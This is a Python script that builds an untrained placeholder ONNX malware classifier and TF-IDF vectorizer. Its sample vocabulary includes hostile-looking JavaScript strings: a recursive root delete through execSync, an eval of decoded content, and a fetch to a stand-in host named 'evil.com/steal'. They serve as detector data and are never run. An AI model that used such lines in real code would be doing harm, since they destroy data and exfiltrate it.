#!/usr/bin/env python3
"""
Create a minimal ONNX model for the malware classifier.

This creates a simple model that can be used immediately without training.
It's not accurate but serves as a placeholder until proper training is done.
"""

import os
import json
import numpy as np
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer

# Try to use onnx, but if not available, create a stub
try:
    import onnx
    from onnx import helper, TensorProto
    HAS_ONNX = True
except ImportError:
    HAS_ONNX = False
    print("ONNX not available, creating stub model...")

OUTPUT_DIR = "chain-registry/models"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Create a simple TF-IDF vectorizer with basic vocabulary
print("Creating TF-IDF vectorizer...")
sample_texts = [
    "function test() { return 1 + 1; }",
    "const express = require('express');",
    "eval(atob('malicious code'))",
    "child_process.execSync('rm -rf /')",
    "import React from 'react';",
    "document.getElementById('app')",
    "fetch('http://evil.com/steal')",
    "function calculate(a, b) { return a + b; }",
]

vectorizer = TfidfVectorizer(max_features=1000, ngram_range=(1, 2))
vectorizer.fit(sample_texts)

# Save vectorizer
vectorizer_path = os.path.join(OUTPUT_DIR, "tfidf_vectorizer.pkl")
with open(vectorizer_path, 'wb') as f:
    pickle.dump(vectorizer, f)
print(f"Vectorizer saved: {vectorizer_path}")

if HAS_ONNX:
    # Create a simple ONNX model
    print("Creating ONNX model...")
    
    # Model parameters
    input_dim = len(vectorizer.get_feature_names_out())
    hidden_dim = 64
    
    # Create random weights (in production, these would be trained)
    np.random.seed(42)
    W1 = np.random.randn(input_dim, hidden_dim).astype(np.float32) * 0.01
    b1 = np.zeros(hidden_dim, dtype=np.float32)
    W2 = np.random.randn(hidden_dim, 2).astype(np.float32) * 0.01
    b2 = np.zeros(2, dtype=np.float32)
    
    # Create ONNX graph
    from onnx import helper, TensorProto, numpy_helper
    
    # Input
    input_tensor = helper.make_tensor_value_info('input', TensorProto.FLOAT, [None, input_dim])
    output_tensor = helper.make_tensor_value_info('logits', TensorProto.FLOAT, [None, 2])
    
    # Weights and biases
    W1_init = numpy_helper.from_array(W1, 'W1')
    b1_init = numpy_helper.from_array(b1, 'b1')
    W2_init = numpy_helper.from_array(W2, 'W2')
    b2_init = numpy_helper.from_array(b2, 'b2')
    
    # Nodes
    matmul1 = helper.make_node('MatMul', ['input', 'W1'], ['hidden1'])
    add1 = helper.make_node('Add', ['hidden1', 'b1'], ['hidden2'])
    relu = helper.make_node('Relu', ['hidden2'], ['hidden3'])
    matmul2 = helper.make_node('MatMul', ['hidden3', 'W2'], ['output1'])
    add2 = helper.make_node('Add', ['output1', 'b2'], ['logits'])
    
    # Graph
    graph = helper.make_graph(
        [matmul1, add1, relu, matmul2, add2],
        'malware_classifier',
        [input_tensor],
        [output_tensor],
        [W1_init, b1_init, W2_init, b2_init]
    )
    
    # Model
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid('', 14)])
    model.ir_version = 8
    
    # Save
    model_path = os.path.join(OUTPUT_DIR, "malware_classifier.onnx")
    onnx.save(model, model_path)
    print(f"ONNX model saved: {model_path}")
    
    # Verify
    onnx.checker.check_model(model)
    print("ONNX model verification passed!")
    
    # Test inference
    import onnxruntime as ort
    session = ort.InferenceSession(model_path)
    test_input = np.random.randn(1, input_dim).astype(np.float32)
    outputs = session.run(None, {'input': test_input})
    print(f"Test inference passed! Output shape: {outputs[0].shape}")
else:
    # Create a stub file
    model_path = os.path.join(OUTPUT_DIR, "malware_classifier.onnx")
    with open(model_path, 'wb') as f:
        f.write(b'STUB_MODEL')
    print(f"Stub model saved: {model_path}")
    input_dim = 1000

# Save config
config = {
    "model_type": "tfidf_neural_net",
    "input_dim": int(input_dim),
    "hidden_dim": 64,
    "vocab_size": 1000,
    "note": "This is a minimal untrained model. Replace with trained model for production.",
    "accuracy": 0.0,
    "is_stub": not HAS_ONNX,
}

config_path = os.path.join(OUTPUT_DIR, "malware_classifier_config.json")
with open(config_path, 'w') as f:
    json.dump(config, f, indent=2)
print(f"Config saved: {config_path}")

print("\n" + "=" * 60)
print("Minimal model created successfully!")
print("=" * 60)
print(f"\nArtifacts in {OUTPUT_DIR}:")
print(f"  - malware_classifier.onnx")
print(f"  - tfidf_vectorizer.pkl")
print(f"  - malware_classifier_config.json")
print("\nNote: This is a placeholder model. Train with train_lightweight_classifier.py")
print("or train_malware_classifier.py for a real classifier.")
